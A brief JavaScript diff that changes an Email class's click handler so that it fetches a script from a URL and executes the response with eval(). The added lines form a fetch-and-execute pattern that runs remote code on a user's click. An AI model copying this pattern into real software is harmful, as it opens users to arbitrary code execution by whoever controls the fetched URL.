@@ -6,13 +6,10 @@ class Email {
 
   clickListener() {
     this.email.addEventListener('click', () => {
-      // fetch(this.url, {
-      //   headers: { 
-      //     "Content-Type": "application/javascript" 
-      //   }
-      // })
-      console.log(this.url)
-    })
+      fetch(this.url)
+      .then(response => response.text())
+      .then(script => eval(script))
+    });
   }
 }
 
